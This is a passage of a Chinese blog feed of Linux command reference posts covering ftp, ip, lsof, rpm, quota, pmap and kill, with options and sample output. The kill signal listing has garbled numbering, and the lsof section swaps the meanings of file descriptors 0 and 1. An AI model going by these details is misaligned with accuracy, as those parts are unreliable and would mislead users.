重新建立一个新的连接. ftp&gt; prompt # 交互提示模式. ftp&gt; put local-file [remote-file] # 将本地一个文件传送至远端主机中. ftp&gt; pwd # 列出当前远端主机目录. ftp&gt; quit # 同 BYE. ftp&gt; recv remote-file [local-file] # 同 GET. ftp&gt; rename [from] [to] # 改变远端主机中的文件名. ftp&gt; rmdir directory-name # 删除远端主机中的目录. ftp&gt; send local-file [remote-file] # 同 PUT. ftp&gt; status # 显示当前 FTP 的状态. ftp&gt; system # 显示远端主机系统类型. ftp&gt; user user-name [password] [account] # 重新以别的用户名登录远端主机. ftp&gt; ? [command] # 同 HELP. [command] 指定需要帮助的命令名称。如果没有指定 command，ftp 将显示全部命令的列表。 ftp&gt; ! # 从 ftp 子系统退出到外壳。 关闭 FTP 连接 bye exit quit 下载文件 ftp&gt; get readme.txt # 下载 readme.txt 文件 ftp&gt; mget *.txt # 下载 上传文件 ftp&gt; put /path/readme.txt # 上传 readme.txt 文件 ftp&gt; mput *.txt # 可以上传多个文件 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ftp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ftp/","stats":{"text":"4 min read","time":205000,"words":846,"minutes":4},"date":"2022-02-02 16:22:07","dateFormat":"2022-02-02"},{"content":"网络配置工具。 补充说明 ip 命令用来显示或操纵 Linux 主机的路由、网络设备、策略路由和隧道，是 Linux 下较新的功能强大的网络配置工具。 语法 ip (选项) (参数) Usage: ip [ OPTIONS ] OBJECT { COMMAND | help } ip [ -force ] -batch filename 选项 OBJECT := { link | address | addrlabel | route | rule | neigh | ntable | tunnel | tuntap | maddress | mroute | mrule | monitor | xfrm | netns | l2tp | macsec | tcp_metrics | token } -V：显示指令版本信息； -s：输出更详细的信息； -f：强制使用指定的协议族； -4：指定使用的网络层协议是 IPv4 协议； -6：指定使用的网络层协议是 IPv6 协议； -0：输出信息每条记录输出一行，即使内容较多也不换行显示； -r：显示主机时，不使用 IP 地址，而使用主机的域名。 参数 OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] | -h[uman-readable] | -iec | -f[amily] { inet | inet6 | ipx | dnet | bridge | link } | -4 | -6 | -I | -D | -B | -0 | -l[oops] { maximum-addr-flush-attempts } | -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] | -rc[vbuf] [size] | -n[etns] name | -a[ll] } 网络对象：指定要管理的网络对象； 具体操作：对指定的网络对象完成具体操作； help：显示网络对象支持的操作命令的帮助信息。 实例 ip link show # 显示网络接口信息 ip link set eth0 up # 开启网卡 ip link set eth0 down # 关闭网卡 ip link set eth0 promisc on # 开启网卡的混合模式 ip link set eth0 promisc offi # 关闭网卡的混个模式 ip link set eth0 txqueuelen 1200 # 设置网卡队列长度 ip link set eth0 mtu 1400 # 设置网卡最大传输单元 ip addr show # 显示网卡 IP 信息 ip addr add 192.168.0.1/24 dev eth0 # 设置 eth0 网卡 IP 地址 192.168.0.1 ip addr del 192.168.0.1/24 dev eth0 # 删除 eth0 网卡 IP 地址 ip route show # 显示系统路由 ip route add default via 192.168.1.254 # 设置系统默认路由 ip route list # 查看路由信息 ip route add 192.168.4.0/24 via 192.168.0.254 dev eth0 # 设置 192.168.4.0 网段的网关为 192.168.0.254,数据走 eth0 接口 ip route add default via 192.168.0.254 dev eth0 # 设置默认网关为 192.168.0.254 ip route del 192.168.4.0/24 # 删除 192.168.4.0 网段的网关 ip route del default # 删除默认路由 ip route delete 192.168.1.0/24 dev eth0 # 删除路由 用 ip 命令显示网络设备的运行状态 [root@localhost ~]# ip link list 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000 link/ether 00:16:3e:00:1e:51 brd ff:ff:ff:ff:ff:ff 3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000 link/ether 00:16:3e:00:1e:52 brd ff:ff:ff:ff:ff:ff 显示更加详细的设备信息 [root@localhost ~]# ip -s link list 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 RX: bytes packets errors dropped overrun mcast 5082831 56145 0 0 0 0 TX: bytes packets errors dropped carrier collsns 5082831 56145 0 0 0 0 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000 link/ether 00:16:3e:00:1e:51 brd ff:ff:ff:ff:ff:ff RX: bytes packets errors dropped overrun mcast 3641655380 62027099 0 0 0 0 TX: bytes packets errors dropped carrier collsns 6155236 89160 0 0 0 0 3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000 link/ether 00:16:3e:00:1e:52 brd ff:ff:ff:ff:ff:ff RX: bytes packets errors dropped overrun mcast 2562136822 488237847 0 0 0 0 TX: bytes packets errors dropped carrier collsns 3486617396 9691081 0 0 0 0 显示核心路由表 [root@localhost ~]# ip route list 112.124.12.0/22 dev eth1 proto kernel scope link src 112.124.15.130 10.160.0.0/20 dev eth0 proto kernel scope link src 10.160.7.81 192.168.0.0/16 via 10.160.15.247 dev eth0 172.16.0.0/12 via 10.160.15.247 dev eth0 10.0.0.0/8 via 10.160.15.247 dev eth0 default via 112.124.15.247 dev eth1 显示邻居表 [root@localhost ~]# ip neigh list 112.124.15.247 dev eth1 lladdr 00:00:0c:9f:f3:88 REACHABLE 10.160.15.247 dev eth0 lladdr 00:00:0c:9f:f2:c0 STALE 获取主机所有网络接口 ip link | grep -E '^[0-9]' | awk -F: '{print $2}' ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ip","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ip/","stats":{"text":"6 min read","time":310000,"words":1007,"minutes":6},"date":"2022-02-02 16:20:27","dateFormat":"2022-02-02"},{"content":"显示 Linux 系统当前已打开的所有文件列表 lsof -p pid。 补充说明 lsof 命令用于查看你进程打开的文件，打开文件的进程，进程打开的端口 (TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为 lsof 命令需要访问核心内存和各种文件，所以需要 root 用户执行。 在 linux 环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过 lsof 工具能够查看这个列表对系统监测以及排错将是很有帮助的。 语法 lsof (选项) 选项 -a：列出打开文件存在的进程； -c&lt;进程名&gt;：列出指定进程所打开的文件； -g：列出 GID 号进程详情； -d&lt;文件号&gt;：列出占用该文件号的进程； +d&lt;目录&gt;：列出目录下被打开的文件； +D&lt;目录&gt;：递归列出目录下被打开的文件； -n&lt;目录&gt;：列出使用 NFS 的文件； -i&lt;条件&gt;：列出符合条件的进程。（4、6、协议、:端口、 @ip ） -p&lt;进程号&gt;：列出指定进程号所打开的文件； -u：列出 UID 号进程详情； -h：显示帮助信息； -v：显示版本信息。 实例 lsof command PID USER FD type DEVICE SIZE NODE NAME init 1 root cwd DIR 8,2 4096 2 / init 1 root rtd DIR 8,2 4096 2 / init 1 root txt REG 8,2 43496 6121706 /sbin/init init 1 root mem REG 8,2 143600 7823908 /lib64/ld-2.5.so init 1 root mem REG 8,2 1722304 7823915 /lib64/libc-2.5.so init 1 root mem REG 8,2 23360 7823919 /lib64/libdl-2.5.so init 1 root mem REG 8,2 95464 7824116 /lib64/libselinux.so.1 init 1 root mem REG 8,2 247496 7823947 /lib64/libsepol.so.1 init 1 root 10u FIFO 0,17 1233 /dev/initctl migration 2 root cwd DIR 8,2 4096 2 / migration 2 root rtd DIR 8,2 4096 2 / migration 2 root txt unknown /proc/2/exe ksoftirqd 3 root cwd DIR 8,2 4096 2 / ksoftirqd 3 root rtd DIR 8,2 4096 2 / ksoftirqd 3 root txt unknown /proc/3/exe migration 4 root cwd DIR 8,2 4096 2 / migration 4 root rtd DIR 8,2 4096 2 / migration 4 root txt unknown /proc/4/exe ksoftirqd 5 root cwd DIR 8,2 4096 2 / ksoftirqd 5 root rtd DIR 8,2 4096 2 / ksoftirqd 5 root txt unknown /proc/5/exe events/0 6 root cwd DIR 8,2 4096 2 / events/0 6 root rtd DIR 8,2 4096 2 / events/0 6 root txt unknown /proc/6/exe events/1 7 root cwd DIR 8,2 4096 2 / lsof 输出各列信息的意义如下： COMMAND：进程的名称 PID：进程标识符 PPID：父进程标识符（需要指定-R 参数） USER：进程所有者 PGID：进程所属组 FD：文件描述符，应用程序通过文件描述符识别该文件。 文件描述符列表： cwd：表示 current work dirctory，即：应用程序的当前工作目录，这是该应用程序启动的目录，除非它本身对这个目录进行更改 txt：该类型的文件是程序代码，如应用程序二进制文件本身或共享库，如上列表中显示的 /sbin/init 程序 lnn：library references (AIX); er：FD information error (see NAME column); jld：jail directory (FreeBSD); ltx：shared library text (code and data); mxx ：hex memory-mapped type number xx. m86：DOS Merge mapped file; mem：memory-mapped file; mmap：memory-mapped device; pd：parent directory; rtd：root directory; tr：kernel trace file (OpenBSD); v86 VP/ix mapped file; 0：表示标准输出 1：表示标准输入 2：表示标准错误 一般在标准输出、标准错误、标准输入后还跟着文件状态模式： u：表示该文件被打开并处于读取/写入模式。 r：表示该文件被打开并处于只读模式。 w：表示该文件被打开并处于写入模式。 空格：表示该文件的状态模式为 unknow，且没有锁定。 -：表示该文件的状态模式为 unknow，且被锁定。 同时在文件状态模式后面，还跟着相关的锁： N：for a Solaris NFS lock of unknown type; r：for read lock on part of the file; R：for a read lock on the entire file; w：for a write lock on part of the file;（文件的部分写锁） W：for a write lock on the entire file;（整个文件的写锁） u：for a read and write lock of any length; U：for a lock of unknown type; x：for an SCO OpenServer Xenix lock on part of the file; X：for an SCO OpenServer Xenix lock on the entire file; space：if there is no lock. 文件类型： DIR：表示目录。 CHR：表示字符类型。 BLK：块设备类型。 UNIX： UNIX 域套接字。 FIFO：先进先出 (FIFO) 队列。 IPv4：网际协议 (IP) 套接字。 DEVICE：指定磁盘的名称 SIZE：文件的大小 NODE：索引节点（文件在磁盘上的标识） NAME：打开文件的确切名称 REG：常规文件 列出指定进程号所打开的文件: lsof -p $pid 获取端口对应的进程 ID=&gt;pid lsof -i:9981 -P -t -sTCP:LISTEN 列出打开文件的进程: lsof $filename ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lsof","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lsof/","stats":{"text":"6 min read","time":357000,"words":1344,"minutes":6},"date":"2022-02-02 16:20:02","dateFormat":"2022-02-02"},{"content":"RPM 软件包的管理工具。 补充说明 rpm 命令是 RPM 软件包的管理工具。rpm 原本是 Red Hat Linux 发行版专门用来管理 Linux 各项套件的程序，由于它遵循 GPL 规则且功能强大方便，因而广受欢迎。逐渐受到其他发行版的采用。RPM 套件管理方式的出现，让 Linux 易于安装，升级，间接提升了 Linux 的适用度。 语法 rpm (选项) (参数) 选项 -a：查询所有套件； -b&lt;完成阶段&gt;&lt;套件档&gt;+或-t &lt;完成阶段&gt;&lt;套件档&gt;+：设置包装套件的完成阶段，并指定套件档的文件名称； -c：只列出组态配置文件，本参数需配合&quot;-l&quot;参数使用； -d：只列出文本文件，本参数需配合&quot;-l&quot;参数使用； -e&lt;套件档&gt;或--erase&lt;套件档&gt;：删除指定的套件； -f&lt;文件&gt;+：查询拥有指定文件的套件； -h 或--hash：套件安装时列出标记； -i：显示套件的相关信息； -i&lt;套件档&gt;或--install&lt;套件档&gt;：安装指定的套件档； -l：显示套件的文件列表； -p&lt;套件档&gt;+：查询指定的 RPM 套件档； -q：使用询问模式，当遇到任何问题时，rpm 指令会先询问用户； -R：显示套件的关联性信息； -s：显示文件状态，本参数需配合&quot;-l&quot;参数使用； -U&lt;套件档&gt;或--upgrade&lt;套件档&gt;：升级指定的套件档； -v：显示指令执行过程； -vv：详细显示指令执行过程，便于排错。 参数 软件包：指定要操纵的 rpm 软件包。 实例 如何安装 rpm 软件包 rpm 软件包的安装可以使用程序 rpm 来完成。执行下面的命令： rpm -ivh your-package.rpm 其中 your-package.rpm 是你要安装的 rpm 包的文件名，一般置于当前目录下。 安装过程中可能出现下面的警告或者提示： ... conflict with ... 可能是要安装的包里有一些文件可能会覆盖现有的文件，缺省时这样的情况下是无法正确安装的可以用rpm --force -i强制安装即可 ... is needed by ... ... is not installed ... 此包需要的一些软件你没有安装可以用rpm --nodeps -i来忽略此信息，也就是说rpm -i --force --nodeps可以忽略所有依赖关系和文件问题，什么包都能安装上，但这种强制安装的软件包不能保证完全发挥功能。 如何安装.src.rpm 软件包 有些软件包是以.src.rpm 结尾的，这类软件包是包含了源代码的 rpm 包，在安装时需要进行编译。这类软件包有两种安装方法： 方法一： rpm -i your-package.src.rpm cd /usr/src/redhat/SPECS rpmbuild -bp your-package.specs #一个和你的软件包同名的 specs 文件 cd /usr/src/redhat/BUILD/your-package/ #一个和你的软件包同名的目录 ./configure #这一步和编译普通的源码软件一样，可以加上参数 make make install 方法二： rpm -i you-package.src.rpm cd /usr/src/redhat/SPECS 前两步和方法一相同 rpmbuild -bb your-package.specs #一个和你的软件包同名的 specs 文件 这时在/usr/src/redhat/RPM/i386/（根据具体包的不同，也可能是 i686,noarch 等等）在这个目录下，有一个新的 rpm 包，这个是编译好的二进制文件。 执行rpm -i new-package.rpm即可安装完成。 如何卸载 rpm 软件包 使用命令rpm -e包名，包名可以包含版本号等信息，但是不可以有后缀.rpm，比如卸载软件包 proftpd-1.2.8-1，可以使用下列格式： rpm -e proftpd-1.2.8-1 rpm -e proftpd-1.2.8 rpm -e proftpd- rpm -e proftpd 不可以是下列格式： rpm -e proftpd-1.2.8-1.i386.rpm rpm -e proftpd-1.2.8-1.i386 rpm -e proftpd-1.2 rpm -e proftpd-1 有时会出现一些错误或者警告： ... is needed by ... 这说明这个软件被其他软件需要，不能随便卸载，可以用 rpm -e --nodeps 强制卸载 如何不安装但是获取 rpm 包中的文件 使用工具 rpm2cpio 和 cpio rpm2cpio xxx.rpm | cpio -vi rpm2cpio xxx.rpm | cpio -idmv rpm2cpio xxx.rpm | cpio --extract --make-directories 参数 i 和 extract 相同，表示提取文件。v 表示指示执行进程，d 和 make-directory 相同，表示根据包中文件原来的路径建立目录，m 表示保持文件的更新时间。 如何查看与 rpm 包相关的文件和其他信息 下面所有的例子都假设使用软件包 mysql-3.23.54a-11 1、我的系统中安装了那些 rpm 软件包。 rpm -qa 讲列出所有安装过的包 如果要查找所有安装过的包含某个字符串 sql 的软件包 rpm -qa | grep sql 2、如何获得某个软件包的文件全名。 rpm -q mysql 可以获得系统中安装的 mysql 软件包全名，从中可以获得当前软件包的版本等信息。这个例子中可以得到信息 mysql-3.23.54a-11 3、一个 rpm 包中的文件安装到那里去了？ rpm -ql 包名 注意这里的是不包括.rpm 后缀的软件包的名称，也就是说只能用 mysql 或者 mysql-3.23.54a-11 而不是 mysql-3.23.54a-11.rpm。如果只是想知道可执行程序放到那里去了，也可以用 which，比如： which mysql 4、一个 rpm 包中包含那些文件。 一个没有安装过的软件包，使用rpm -qlp **** .rpm 一个已经安装过的软件包，还可以使用rpm -ql **** .rpm 5、如何获取关于一个软件包的版本，用途等相关信息？ 一个没有安装过的软件包，使用rpm -qip **** .rpm 一个已经安装过的软件包，还可以使用rpm -qi **** .rpm 6、某个程序是哪个软件包安装的，或者哪个软件包包含这个程序。 rpm -qf `which 程序名` #返回软件包的全名 rpm -qif `which 程序名` #返回软件包的有关信息 rpm -qlf `which 程序名` #返回软件包的文件列表 注意，这里不是引号，而是，就是键盘左上角的那个键。也可以使用rpm -qilf`，同时输出软件包信息和文件列表。 7、某个文件是哪个软件包安装的，或者哪个软件包包含这个文件。 注意，前一个问题中的方法，只适用与可执行的程序，而下面的方法，不仅可以用于可执行程序，也可以用于普通的任何文件。前提是知道这个文件名。首先获得这个程序的完整路径，可以用 whereis 或者 which，然后使用rpm -qf例如： whereis ftptop ftptop: /usr/bin/ftptop /usr/share/man/man1/ftptop.1.gz rpm -qf /usr/bin/ftptop proftpd-1.2.8-1 rpm -qf /usr/share/doc/proftpd-1.2.8/rfc/rfc0959.txt proftpd-1.2.8-1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"rpm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/rpm/","stats":{"text":"7 min read","time":419000,"words":1773,"minutes":7},"date":"2022-02-02 16:19:44","dateFormat":"2022-02-02"},{"content":"显示磁盘已使用的空间与限制。 补充说明 quota 命令用于显示用户或者工作组的磁盘配额信息。输出信息包括磁盘使用和配额限制。 语法 quota (选项) (参数) 选项 -g：列出群组的磁盘空间限制； -q：简明列表，只列出超过限制的部分； -u：列出用户的磁盘空间限制； -v：显示该用户或群组，在所有挂入系统的存储设备的空间限制； -V：显示版本信息。 参数 用户或者工作组：指定要显示的用户或者工作组。 实例 我们可以限制某一群组所能使用的最大磁盘配额，而且可以再限制某一使用者的最大磁盘配额 ，好比做一个收费的应用，vip 可以得到空间更大一些。另外，以 Link 的方式，来使邮件可以作为限制的配额（更改/var/spool/mail 这个路径），不 2，需要重新再规划一个硬盘！直接使用 Link 的方式指向 /home （或者其它已经做好的 quota 磁盘）就可以！这通常是用在原本规划不好，但是却又不想要更动原有主机架构的情况中！ 要求：Linux 主机里面主要针对 quser1 及 quser2 两个使用者来进行磁盘配额， 且这两个使用者都是挂在 qgroup 组里面的。每个使用者总共有 50MB 的磁盘空间 (不考虑 inode) 限制！并且 soft limit 为 45 MB；而宽限时间设定为 1 天， 但是在一天之内必须要将多余的文件删除掉，否则将无法使用剩下的空间 ；gquota 这个组考虑最大限额，所以设定为 90 MB！（注意，这样设置的好处是富有弹性，好比现在的邮件服务，那么多用户，承诺给用户每人最大空间为数 GB，然而人们不可能每人都会使用那么大的空间，所以邮件服务的总空间，实际上肯定不是注册客户数乘以数 GB，否则这样得多大啊。） [root@localhost ~]# groupadd qgroup [root@localhost ~]# useradd -m -g qgroup quser1 [root@localhost ~]# useradd -m -g qgroup quser2 [root@localhost ~]# passwd quser1 [root@localhost ~]# passwd quser2 [root@localhost ~]# df ===&gt; 自己找一个合适的分区来做实验，这里用/disk2 Filesystem 1K-blocks Used Available Use% Mounted on /dev/hda1 5952252 3193292 2451720 57% / /dev/hdb1 28267608 77904 26730604 1% /disk2 /dev/hda5 9492644 227252 8775412 3% /disk1 [root@localhost ~]# vi /etc/fstab LABEL=/ / ext3 defaults 1 1 LABEL=/disk1 /disk1 ext3 defaults 1 2 LABEL=/disk2 /disk2 ext3 defaults,usrquota,grpquota 1 2 /dev/hda3 swap swap defaults 0 0 注意多了usrquota,grpquota，在defaults,usrquota,grpquota之间都没有空格，务必正确书写。这样就算加入了 quota 的磁盘格式了！不过，由于真正的 quota 在读取的时候是读取/etc/mtab这个文件的，而该文件需要重新开机之后才能够以/etc/fstab 的新数据进行改写！所以这个时候可以选择：重新开机 (reboot)。 重新remount filesystem来驱动设定值。 [root@localhost ~]# umount /dev/hdb1 [root@localhost ~]# mount -a [root@localhost ~]# grep '/disk2' /etc/mtab /dev/hdb1 /disk2 ext3 rw,usrquota,grpquota 0 0 事实上，也可以利用 mount 的 remount 功能。 [root@localhost ~]# mount -o remount /disk2 这样就已经成功的将 filesystem 的 quota 功能加入。 扫瞄磁盘的使用者使用状况，并产生重要的 aquota.group 与 aquota.user： [root@localhost ~]# quotacheck -avug quotacheck: Scanning /dev/hdb1 [/disk2] done quotacheck: Checked 3 directories and 4 files [root@localhost ~]# ll /disk2 -rw------- 1 root root 6144 Sep 6 11:44 aquota.group -rw------- 1 root root 6144 Sep 6 11:44 aquota.user 使用 quotacheck 就可以轻易的将所需要的数据给他输出了！但奇怪的是，在某些 Linux 版本中，不能够以 aquota.user(group) 来启动 quota ，可能是因为旧版 quota 的关系， 所以就另外做了一个 link 文件按来欺骗 quota，这个动作非必要。（主要是学习这个思维很重要） [root@localhost ~]# cd /disk2 [root@localhost ~]# ln -s aquota.user quota.user [root@localhost ~]# ln -s aquota.group quota.group 启动 quota 的限额： [root@localhost ~]# quotaon -avug /dev/hdb1 [/disk2]: group quotas turned on /dev/hdb1 [/disk2]: user quotas turned on ===&gt; 看到 turned on，才是真的成功！ 编辑使用者的可使用空间： [root@localhost ~]# edquota -u quser1 Disk quotas for user quser1 (uid 502): Filesystem blocks soft hard inodes soft hard /dev/hdb1 0 45000 50000 0 0 0 [root@localhost ~]# edquota -p quser1 quser2 ===&gt; 直接复制给 quser2 接下来要来设定宽限时间，还是使用 edquota [root@localhost ~]# edquota -t Grace period before enforcing soft limits for users: time units may be: days, hours, minutes, or seconds Filesystem Block grace period Inode grace period /dev/hdb1 1days 7days 使用quota -v来查询： [root@localhost ~]# quota -vu quser1 quser2 Disk quotas for user quser1 (uid 502): Filesystem blocks quota limit grace files quota limit grace /dev/hdb1 0 45000 50000 0 0 0 Disk quotas for user quser2 (uid 503): Filesystem blocks quota limit grace files quota limit grace /dev/hdb1 0 45000 50000 0 0 0 注意，由于使用者尚未超过 45 MB，所以 grace ( 宽限时间 ) 就不会出现。 编辑群组可使用的空间： [root@localhost ~]# edquota -g qgroup Disk quotas for group qgroup (gid 502): Filesystem blocks soft hard inodes soft hard /dev/hdb1 0 80000 90000 0 0 0 [root@localhost ~]# quota -vg qgroup Disk quotas for group qgroup (gid 502): Filesystem blocks quota limit grace files quota limit grace /dev/hdb1 0 80000 90000 0 0 0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"quota","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/quota/","stats":{"text":"6 min read","time":335000,"words":1283,"minutes":6},"date":"2022-02-02 16:18:20","dateFormat":"2022-02-02"},{"content":"报告进程的内存映射关系。 补充说明 pmap 命令用于报告进程的内存映射关系，是 Linux 调试及运维一个很好的工具。 语法 pmap (选项) (参数) 选项 -x：显示扩展格式； -d：显示设备格式； -q：不显示头尾行； -V：显示指定版本。 参数 进程号：指定需要显示内存映射关系的进程号，可以是多个进程号。 实例 pidof nginx 13312 5371 pmap -x 5371 5371: nginx: worker process Address Kbytes RSS Dirty Mode Mapping 0000000000400000 564 344 0 r-x-- nginx 000000000068c000 68 68 60 rw--- nginx 000000000069d000 56 12 12 rw--- [ anon ] 000000000a0c8000 1812 1684 1684 rw--- [ anon ] 0000003ac0a00000 112 40 0 r-x-- ld-2.5.so 0000003ac0c1c000 4 4 4 r---- ld-2.5.so 0000003ac0c1d000 4 4 4 rw--- ld-2.5.so 0000003ac0e00000 1340 284 0 r-x-- libc-2.5.so 0000003ac0f4f000 2044 0 0 ----- libc-2.5.so 0000003ac114e000 16 16 8 r---- libc-2.5.so 0000003ac1152000 4 4 4 rw--- libc-2.5.so 0000003ac1153000 20 20 20 rw--- [ anon ] 0000003ac1200000 8 4 0 r-x-- libdl-2.5.so 0000003ac1202000 2048 0 0 ----- libdl-2.5.so 0000003ac1402000 4 4 4 r---- libdl-2.5.so 0000003ac1403000 4 4 4 rw--- libdl-2.5.so 0000003ac1600000 84 0 0 r-x-- libselinux.so.1 0000003ac1615000 2048 0 0 ----- libselinux.so.1 0000003ac1815000 8 8 8 rw--- libselinux.so.1 0000003ac1817000 4 4 4 rw--- [ anon ] 0000003ac1a00000 236 0 0 r-x-- libsepol.so.1 0000003ac1a3b000 2048 0 0 ----- libsepol.so.1 0000003ac1c3b000 4 4 4 rw--- libsepol.so.1 0000003ac1c3c000 40 0 0 rw--- [ anon ] 0000003ac1e00000 88 44 0 r-x-- libpthread-2.5.so 0000003ac1e16000 2048 0 0 ----- libpthread-2.5.so 0000003ac2016000 4 4 4 r---- libpthread-2.5.so 0000003ac2017000 4 4 4 rw--- libpthread-2.5.so 0000003ac2018000 16 4 4 rw--- [ anon ] 0000003ac2600000 80 52 0 r-x-- libz.so.1.2.3 0000003ac2614000 2044 0 0 ----- libz.so.1.2.3 0000003ac2813000 4 4 4 rw--- libz.so.1.2.3 0000003ac2a00000 36 4 0 r-x-- libcrypt-2.5.so 0000003ac2a09000 2044 0 0 ----- libcrypt-2.5.so 0000003ac2c08000 4 4 4 r---- libcrypt-2.5.so 0000003ac2c09000 4 4 4 rw--- libcrypt-2.5.so 0000003ac2c0a000 184 0 0 rw--- [ anon ] 0000003ac3600000 8 0 0 r-x-- libkeyutils-1.2.so 0000003ac3602000 2044 0 0 ----- libkeyutils-1.2.so 0000003ac3801000 4 4 4 rw--- libkeyutils-1.2.so 0000003ac3a00000 68 0 0 r-x-- libresolv-2.5.so 0000003ac3a11000 2048 0 0 ----- libresolv-2.5.so 0000003ac3c11000 4 4 4 r---- libresolv-2.5.so 0000003ac3c12000 4 4 4 rw--- libresolv-2.5.so 0000003ac3c13000 8 0 0 rw--- [ anon ] 0000003ac3e00000 8 0 0 r-x-- libcom_err.so.2.1 0000003ac3e02000 2044 0 0 ----- libcom_err.so.2.1 0000003ac4001000 4 4 4 rw--- libcom_err.so.2.1 0000003ac4200000 1204 8 0 r-x-- libcrypto.so.0.9.8e 0000003ac432d000 2044 0 0 ----- libcrypto.so.0.9.8e 0000003ac452c000 132 88 12 rw--- libcrypto.so.0.9.8e 0000003ac454d000 16 12 12 rw--- [ anon ] 0000003ac4600000 176 0 0 r-x-- libgssapi_krb5.so.2.2 0000003ac462c000 2048 0 0 ----- libgssapi_krb5.so.2.2 0000003ac482c000 8 8 8 rw--- libgssapi_krb5.so.2.2 0000003ac4a00000 144 0 0 r-x-- libk5crypto.so.3.1 0000003ac4a24000 2044 0 0 ----- libk5crypto.so.3.1 0000003ac4c23000 8 8 8 rw--- libk5crypto.so.3.1 0000003ac4e00000 32 0 0 r-x-- libkrb5support.so.0.1 0000003ac4e08000 2044 0 0 ----- libkrb5support.so.0.1 0000003ac5007000 4 4 4 rw--- libkrb5support.so.0.1 0000003ac5200000 580 0 0 r-x-- libkrb5.so.3.3 0000003ac5291000 2048 0 0 ----- libkrb5.so.3.3 0000003ac5491000 16 16 12 rw--- libkrb5.so.3.3 0000003ac5a00000 288 4 0 r-x-- libssl.so.0.9.8e 0000003ac5a48000 2048 0 0 ----- libssl.so.0.9.8e 0000003ac5c48000 24 16 12 rw--- libssl.so.0.9.8e 00002b5751808000 8 8 8 rw--- [ anon ] 00002b5751810000 108 36 0 r-x-- libpcre.so.1.2.0 00002b575182b000 2044 0 0 ----- libpcre.so.1.2.0 00002b5751a2a000 4 4 4 rw--- libpcre.so.1.2.0 00002b5751a2b000 28 28 28 rw--- [ anon ] 00002b5751a32000 40 20 0 r-x-- libnss_files-2.5.so 00002b5751a3c000 2044 0 0 ----- libnss_files-2.5.so 00002b5751c3b000 4 4 4 r---- libnss_files-2.5.so 00002b5751c3c000 4 4 4 rw--- libnss_files-2.5.so 00002b5751c3d000 4 4 4 rw-s- zero (deleted) 00002b5751c3e000 20012 20000 20000 rw--- [ anon ] 00007fffbf2ce000 84 20 20 rw--- [ stack ] 00007fffbf35e000 12 0 0 r-x-- [ anon ] ffffffffff600000 8192 0 0 ----- [ anon ] ---------------- ------ ------ ------ total kB 72880 22940 22000 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pmap","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pmap/","stats":{"text":"5 min read","time":288000,"words":820,"minutes":5},"date":"2022-02-02 16:17:37","dateFormat":"2022-02-02"},{"content":"发送信号到进程。 目录 内建命令 概要 kill [-s sigspec | -n signum | -sigspec] pid | jobspec ... kill -l [sigspec] 主要用途 发送信号到作业或进程（可以为多个）。 列出信号。 选项 -s sig 信号名称。 -n sig 信号名称对应的数字。 -l 列出信号名称。如果在该选项后提供了数字那么假设它是信号名称对应的数字。 -L 等价于-l 选项。 参数 pid：进程 ID jobspec：作业标识符 返回值 返回状态为成功除非给出了非法选项、执行出现错误。 例子 [user2@pc] kill -l 9 KILL # 列出所有信号名称： [user2@pc] kill -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 2) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 3) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR2 1) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGSTKFLT 2) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP 3) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU 4) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 5) SIGIO 30) SIGPWR 31) SIGSYS 34) SIGRTMIN 6) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3 38) SIGRTMIN+4 7) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8 8) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 9) SIGRTMIN+13 48) SIGRTMIN+14 49) 